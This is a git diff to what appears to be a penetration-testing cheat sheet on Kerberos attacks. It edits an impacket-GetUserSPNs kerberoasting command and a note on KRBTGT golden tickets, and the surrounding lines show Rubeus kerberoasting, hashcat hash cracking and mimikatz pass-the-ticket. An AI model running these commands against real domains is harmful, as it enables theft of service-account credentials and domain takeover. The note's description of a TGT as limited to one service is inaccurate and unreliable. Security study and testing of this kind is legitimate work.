@@ -33,7 +33,7 @@ crack service password.
 Rubeus.exe kerberoast
 
 # dump the Kerberos hash for all kerberoastable accounts
-impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip DC_IP -request
+impacket-GetUserSPNs DOMAIN.com/USER:'PASS' -dc-ip DC_IP -request
 hashcat -m 13100
 ```
 
@@ -90,7 +90,7 @@ kerberos::ptt TICKET
 
 NOTE:
 
-* **KRBTGT: **service account in KDC; issues all TGTs. If impersonate this account and create a golden ticket we have
+* **KRBTGT:** service account in KDC; issues all TGTs. If impersonate this account and create a golden ticket we have
   ability to create a service ticket for any service
 * **TGT:** ticket to a service account issued by the KDC and can only access that service.
 
